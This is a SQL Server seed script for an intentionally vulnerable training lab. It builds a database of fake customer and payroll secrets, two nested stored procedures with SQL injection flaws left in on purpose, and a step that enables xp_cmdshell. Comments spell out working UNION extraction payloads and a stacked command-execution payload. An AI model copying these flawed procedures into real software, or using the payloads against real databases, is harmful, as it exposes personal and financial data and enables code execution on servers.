/* =====================================================================================
   seed_vuln.sql  —  ALPHA-SECRETS (SecretsDb)   [role: alpha_sql_seed]
   INTENTIONALLY VULNERABLE — LAB / TRAINING USE ONLY.  Milestones 9.1 - 9.4.

   DESIGN UPDATE: dd1.alpha is the alpha.local DOMAIN CONTROLLER, so the entire
   Milestone-9 layered SQL injection is collapsed onto THIS single MSSQL instance
   (secrets.alpha) using NESTED vulnerable stored procedures:

       usp_SearchCustomers  (OUTER)  -- 9.1 SQLi  +  9.2 EXEC(@sql) dynamic concat
             |
             +--CALL--> usp_LookupCity  (INNER)  -- 9.3 nested CALL injection, 9.4 UNION

   Crown jewels: dbo.Payroll (final exfil target) and dbo.CustomerSecrets
   (SSN / CreditCardNumber / Salary / ApiKey).

   Idempotent: re-running fully recreates the tables/data and CREATE-OR-ALTERs the procs.
   Refs: OWASP SQL Injection ; CWE-89.
   sqlcmd scripting var:  $(LoopbackLinkedServer)  = 1 to create the [SECRETS] loopback.
   ===================================================================================== */
SET NOCOUNT ON;
GO

/* ---- database ---- */
IF DB_ID('SecretsDb') IS NULL
    EXEC('CREATE DATABASE SecretsDb');
GO
USE SecretsDb;
GO

/* ---- (re)create tables ---- */
IF OBJECT_ID('dbo.CustomerSecrets','U') IS NOT NULL DROP TABLE dbo.CustomerSecrets;
IF OBJECT_ID('dbo.Customers','U')       IS NOT NULL DROP TABLE dbo.Customers;
IF OBJECT_ID('dbo.Payroll','U')         IS NOT NULL DROP TABLE dbo.Payroll;
GO

CREATE TABLE dbo.Customers(
    CustomerId INT IDENTITY(1,1) PRIMARY KEY,
    FullName   NVARCHAR(100) NOT NULL,
    City       NVARCHAR(60)  NOT NULL
);
GO

CREATE TABLE dbo.CustomerSecrets(          -- sensitive PII/PCI (2-col & 3-col UNION source)
    SecretId         INT IDENTITY(1,1) PRIMARY KEY,
    CustomerId       INT           NOT NULL,
    SSN              CHAR(11)      NOT NULL,
    CreditCardNumber VARCHAR(19)   NOT NULL,
    Salary           DECIMAL(12,2) NOT NULL,
    ApiKey           VARCHAR(64)   NOT NULL
);
GO

CREATE TABLE dbo.Payroll(                  -- CROWN JEWELS — the final M9 exfil target
    EmpId  INT IDENTITY(1,1) PRIMARY KEY,
    Name   NVARCHAR(100) NOT NULL,
    SSN    CHAR(11)      NOT NULL,
    Salary DECIMAL(12,2) NOT NULL,
    ApiKey VARCHAR(64)   NOT NULL
);
GO

/* ---- seed data ---- */
INSERT dbo.Customers(FullName, City) VALUES
 (N'Alice Nakamura', N'Portland'),
 (N'Bob Petrov',     N'Seattle'),
 (N'Carla Diaz',     N'Denver'),
 (N'Derek Osei',     N'Austin');
GO

INSERT dbo.CustomerSecrets(CustomerId, SSN, CreditCardNumber, Salary, ApiKey) VALUES
 (1, '501-22-9834', '4556-1122-3344-5566', 128500.00, 'ck_live_9f2b8a1c77e04d3aa1b6c5d4e3f20194'),
 (2, '502-64-1177', '5301-7788-9910-2244', 141750.00, 'ck_live_2d7e1f9b40aa4c65b8930af1c6d5e7b2'),
 (3, '503-19-5540', '4024-0071-2255-8890',  98230.00, 'ck_live_88b3c0d15e7f42a09c1b6e4d3f8a2071'),
 (4, '504-73-2098', '6011-4455-6677-8899', 112400.00, 'ck_live_a1c2e3d4b5069788f0e1d2c3b4a59687');
GO

INSERT dbo.Payroll(Name, SSN, Salary, ApiKey) VALUES
 (N'Jane Vault (CEO)',   '099-11-7788', 675000.00, 'sk_prod_TLO_toplevel_5e4d3c2b1a0987654321'),
 (N'Mark Ledger (CFO)',  '088-22-6655', 540000.00, 'sk_prod_TLO_finance_1122334455667788aabb'),
 (N'Priya Root (CTO)',   '077-33-4499', 560000.00, 'sk_prod_TLO_platform_ffee00ddccbb99887766'),
 (N'Sam Quill (VP Eng)', '066-44-3322', 410000.00, 'sk_prod_TLO_release_0f1e2d3c4b5a69788796');
GO

/* =====================================================================================
   9.3 / 9.4  —  INNER proc.  Nested CALL injection lands here; UNION-based extraction.
   VULNERABLE: @City is string-concatenated into dynamic SQL (no parameterization).
   The built query has 2 output columns, so the 2-column UNION payload works here:
     x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets --
     x' UNION SELECT EmpId, Name+'|'+SSN+'|'+ApiKey FROM [SECRETS].SecretsDb.dbo.Payroll --
   ===================================================================================== */
CREATE OR ALTER PROCEDURE dbo.usp_LookupCity
    @City NVARCHAR(400)
AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @q NVARCHAR(MAX);
    -- CWE-89: attacker input concatenated directly into the statement text
    SET @q = N'SELECT CustomerId, City FROM dbo.Customers WHERE City = ''' + @City + N''';';
    EXEC(@q);
END
GO

/* =====================================================================================
   9.1 / 9.2  —  OUTER proc.  Own SQLi + EXEC(@sql) dynamic concat, AND forwards the raw
   input into the inner proc (9.3). The built query has 3 output columns, so the
   3-column UNION payload works at this layer:
     %' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets --
   SQLi -> RCE (stacked, xp_cmdshell is enabled by the ludus_mssql role):
     %'; EXEC xp_cmdshell 'whoami'; --
   ===================================================================================== */
CREATE OR ALTER PROCEDURE dbo.usp_SearchCustomers
    @SearchTerm NVARCHAR(400)
AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @sql NVARCHAR(MAX);

    -- 9.3 nested CALL: forwards attacker input UNCHANGED into the inner proc
    BEGIN TRY
        EXEC dbo.usp_LookupCity @SearchTerm;
    END TRY
    BEGIN CATCH
        -- swallow errors so the outer query still runs (helps blind/UNION probing)
    END CATCH;

    -- 9.1 / 9.2 outer dynamic concat (CWE-89)
    SET @sql = N'SELECT CustomerId, FullName, City FROM dbo.Customers WHERE FullName LIKE ''%' + @SearchTerm + N'%'';';
    BEGIN TRY
        EXEC(@sql);
    END TRY
    BEGIN CATCH
    END CATCH;
END
GO

/* =====================================================================================
   Optional loopback linked server [SECRETS] -> localhost (design-update "flavor").
   Lets the cross-hop payload FROM [SECRETS].SecretsDb.dbo.Payroll resolve on one host.
   Guarded + wrapped so a missing OLEDB provider never fails the seed.
   ===================================================================================== */
IF '$(LoopbackLinkedServer)' = '1'
BEGIN
    BEGIN TRY
        IF NOT EXISTS (SELECT 1 FROM sys.servers WHERE name = 'SECRETS')
        BEGIN
            EXEC master.dbo.sp_addlinkedserver
                 @server     = N'SECRETS',
                 @srvproduct = N'',
                 @provider   = N'MSOLEDBSQL',
                 @datasrc    = N'localhost';
            EXEC master.dbo.sp_addlinkedsrvlogin
                 @rmtsrvname = N'SECRETS',
                 @useself    = N'TRUE';       -- pass the caller's creds (no sa pw needed)
            EXEC master.dbo.sp_serveroption N'SECRETS', N'rpc out',     N'true';
            EXEC master.dbo.sp_serveroption N'SECRETS', N'data access', N'true';
            PRINT 'Loopback linked server [SECRETS] created.';
        END
    END TRY
    BEGIN CATCH
        PRINT 'Loopback linked server [SECRETS] not created: ' + ERROR_MESSAGE();
    END CATCH
END
GO

/* ---- belt-and-suspenders: ensure xp_cmdshell for the SQLi->RCE payload ---- */
BEGIN TRY
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;            RECONFIGURE;
END TRY
BEGIN CATCH
    PRINT 'xp_cmdshell not (re)configured: ' + ERROR_MESSAGE();
END CATCH
GO

PRINT 'seed_vuln.sql complete: SecretsDb + nested vulnerable procs seeded.';
GO
